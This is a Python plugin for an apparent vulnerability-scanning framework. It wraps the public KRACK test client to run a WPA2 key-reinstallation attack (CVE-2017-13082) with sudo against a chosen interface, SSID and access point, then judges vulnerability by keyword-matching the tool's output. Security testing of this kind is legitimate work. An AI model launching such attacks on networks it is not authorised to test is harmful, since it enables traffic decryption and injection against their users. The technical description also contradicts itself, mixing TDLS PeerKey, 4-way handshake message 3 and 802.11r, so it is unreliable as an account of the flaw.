#!/usr/bin/env python3
"""CVE-2017-13082 – KRACK: WPA2 TDLS PeerKey handshake key reinstallation.

Public PoC source: https://github.com/vanhoefm/krackattacks-scripts
  krackattack/krack-test-client.py (Mathy Vanhoef, 2017)
  krackattack/krack-all-zero-tk.py

Attack technique:
  The 4-way WPA2 handshake key (PTK/GTK) can be reinstalled by replaying
  handshake messages.  CVE-2017-13082 targets TDLS (Tunneled Direct Link Setup)
  PeerKey re-keying: replaying TDLS message 1 reinstalls an already-used PTK,
  resetting nonce and replay counters.
  krack-test-client.py acts as a rogue AP, intercepts 4-way handshake message 3,
  replays it to force key reinstallation, then verifies by sending a broadcast
  ARP with nonce=1.

Dependencies (required in PATH):
  - hostapd (patched Vanhoef version from krackattacks-scripts/hostapd/)
  - wpa_supplicant
  - Python 3 + scapy + libwifi (from repo)
"""
from __future__ import annotations

import os
import shutil
import subprocess
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 30,
    "cve": "CVE-2017-13082",
    "year": 2017,
    "domain": "wireless",
    "vendor_product": "wpa_supplicant / hostapd (WPA2 clients and APs, 802.11r)",
    "component": "TDLS PeerKey handshake (4-way WPA2 message 3 replay)",
    "type": "Key reinstallation → nonce reuse → decryption / injection",
    "summary": (
        "Replaying TDLS Peer Key Setup Confirm (message 1) reinstalls an "
        "in-use PTK, resetting the nonce counter and enabling plaintext "
        "recovery or traffic injection into the WPA2-protected link."
    ),
    "source_url": "https://github.com/vanhoefm/krackattacks-scripts",
    "requires_manual_review": True,
    "affected": [{"vendor": "Multiple", "product": "WPA2 clients/APs", "versions": [{"version": "pre-2017-10 patch", "status": "affected"}]}],
}

KRACK_REPO = Path(__file__).parent.parent.parent / \
    "public_poc_sources/repos/vanhoefm__krackattacks-scripts"
KRACK_TEST_CLIENT = KRACK_REPO / "krackattack" / "krack-test-client.py"
KRACK_ALL_ZERO_TK = KRACK_REPO / "krackattack" / "krack-all-zero-tk.py"

# Test variants map (from krack-test-client.py TestOptions)
# variant: Fourway=2, Grouphs=3
_TEST_VARIANT = {
    "CVE-2017-13082": {"variant": "Fourway", "--tptk": None, "description": "4-way HS PTK reinstall"},
}


def _check_krack_deps() -> dict:
    """Check whether patched hostapd, wpa_supplicant, and Python libs are available."""
    deps = {
        "hostapd": shutil.which("hostapd") is not None,
        "wpa_supplicant": shutil.which("wpa_supplicant") is not None,
        "krack_test_client": KRACK_TEST_CLIENT.exists(),
        "krack_all_zero_tk":  KRACK_ALL_ZERO_TK.exists(),
        "scapy_available": False,
    }
    try:
        import scapy  # noqa
        deps["scapy_available"] = True
    except ImportError:
        pass
    return deps


def _run_poc(plugin):
    iface    = (plugin.params or {}).get("interface", "wlan0")
    target   = (plugin.params or {}).get("target_bssid", "")
    ssid     = (plugin.params or {}).get("ssid", "testnet")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    deps = _check_krack_deps()
    evidence = {
        "cve": "CVE-2017-13082",
        "krack_repo": str(KRACK_REPO),
        "dependencies": deps,
        "test_variant": "Fourway 4-way HS PTK reinstall (CVE-2017-13082)",
    }

    if not all([deps["krack_test_client"], deps["hostapd"], deps["wpa_supplicant"]]):
        evidence["detail"] = (
            "Missing dependencies.  Install patched hostapd/wpa_supplicant from "
            f"{KRACK_REPO}/hostapd/ and ensure scapy is installed."
        )
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    if allow_disruptive and iface and ssid:
        cmd = [
            "sudo", "python3", str(KRACK_TEST_CLIENT),
            iface, ssid,
        ]
        if target:
            cmd += ["--target", target]
        evidence["command"] = " ".join(cmd)
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            evidence["rc"]     = proc.returncode
            evidence["stdout"] = proc.stdout[:800]
            evidence["stderr"] = proc.stderr[:400]
            evidence["vulnerable"] = "KRACK" in proc.stdout or "reinstall" in proc.stdout.lower()
        except subprocess.TimeoutExpired:
            evidence["detail"] = "Test timed out after 60s."
        except Exception as exc:
            evidence["detail"] = str(exc)
    else:
        evidence["detail"] = (
            "Provide interface=, ssid=, and allow_disruptive=true to run "
            f"krack-test-client.py against a target WPA2 AP."
        )

    return {
        "vulnerable": evidence.get("vulnerable"),
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "vanhoefm/krackattacks-scripts / krack-test-client.py",
    }


class Poc68CVE201713082KrackTdlsKeyReinstallAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-WIRELESS-068"
    meta_poc_name   = "CVE-2017-13082 KRACK WPA2 TDLS PeerKey Key Reinstallation"
    meta_cve_id     = "CVE-2017-13082"
    meta_severity   = "High"
    meta_protocol   = "wifi"
    meta_target_os  = ["linux", "embedded"]
    meta_required_params = ["interface", "ssid"]
    meta_optional_params = ["target_bssid", "allow_disruptive"]
    meta_profiles   = ["wireless"]
    meta_source_url = "https://github.com/vanhoefm/krackattacks-scripts"
    meta_attack_surface = "WPA2 TDLS key reinstallation nonce reuse attack"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return bool((self.params or {}).get("interface"))

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
